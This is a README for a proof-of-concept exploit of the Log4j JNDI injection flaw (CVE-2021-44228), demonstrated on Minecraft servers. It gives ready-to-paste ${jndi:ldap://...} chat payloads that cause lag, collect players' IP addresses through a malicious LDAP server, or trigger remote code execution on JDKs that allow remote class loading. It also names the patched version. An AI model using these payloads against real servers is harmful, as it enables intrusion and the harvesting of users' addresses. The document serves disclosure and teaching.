# Proof of Concept for Log4j (CVE-2021-44228)

## Disclaimer

This project is only for educational purposes.

---

## Introduction

This is a proof of concept of the log4j rce adapted from HyCraftHD.

This bug affects nearly all log4j2 and maybe log4j1 versions. The recommended version to use is **[2.15.0](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.15.0)** which fixes the exploit.

## Demonstration with minecraft (which uses log4j2)

### Lag or sending serialized data 

- Paste ``${jndi:ldap://127.0.0.1/e}`` in the chat. If there is an open socket on port ``389`` logj4 tries to connect and blocks further communiction until a timeout occurs.
- When using this proof of concept exploit, the log in the console will log ``We do a lil trolling!`` which is a serialized string object from the ldap server.

![image](https://user-images.githubusercontent.com/7681220/145529175-b6f88cf0-67d0-450b-a834-87942202d594.png)

- Additionally the malicious ldap server receives every ip address where the message is logged. This means that ip adresses of players on a server can be collected which this exploit.

### RCE

- Paste ``${jndi:ldap://127.0.0.1/exe}`` in the chat. If ``-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`` is set to true the remote code execution will happen.

![image](https://user-images.githubusercontent.com/7681220/145529797-a3952c3e-c81e-4e91-b383-490688736f9c.png)

- Fortunately modern jdks disable remote class loading by default. (https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
- Old versions may still allow this!!




 
